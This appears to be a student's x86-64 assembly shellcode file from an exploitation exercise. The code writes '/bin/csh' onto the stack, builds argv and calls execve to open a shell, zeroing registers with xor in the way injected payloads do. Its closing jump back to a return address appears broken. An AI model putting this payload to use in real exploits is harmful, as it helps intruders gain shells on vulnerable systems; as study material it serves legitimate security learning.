# Copy of shell.s missing the exit syscall
# Instead we attempt to jump back to the original return address

  .text

.global _start

_start:
  # Push rbp on the stack
  push %rbp
  # Move the stack pointer to rbp
  mov %rsp, %rbp
  # Reserve 20 bytes for data on the stack
  sub $0x14, %rsp

  # Put "/bin/csh" in our reserved space with a null at the end
  movl $0x6e69622f, -20(%rbp)
  movl $0x6873632f, -16(%rbp)
  #movl $0x0, -12(%rbp)
  xor %r8, %r8
  movl %r8d, -12(%rbp)

  # This section acts as char * argv[]
  # Get a pointer to the string in %r9
  lea -20(%rbp), %r9
  # Move the value of %r9 to the stack
  mov %r9, -8(%rbp)
  # Put a null on the end of the stack
  #movl $0x0, 0x0(%rbp)
  xor %r8, %r8
  movl %r8d, 0x0(%rbp)
  
  # Syscall number for execve
  mov $59, %rax
  # Zero rdi
  xor %rdi, %rdi
  # Load the string ptr into rdi
  lea -20(%rbp), %rdi
  # Zero rsi
  xor %rsi, %rsi
  # Get a pointer to the pointer we put on the stack earlier
  lea -8(%rbp), %rsi
  # Set cahr * envp[] to null
  #mov $0x0, %rdx
  xor %r8, %r8
  mov %r8, %rdx
  # Open the shell
  syscall

  # Restore the original stack pointer
  add $0x14, %rsp
  # Pop back off the original base pointer
  pop %rbp
  
  # Load the return value from the previous function
  lea -8(%rbp), %r8
  # Jump to the return value
  jmp %r8
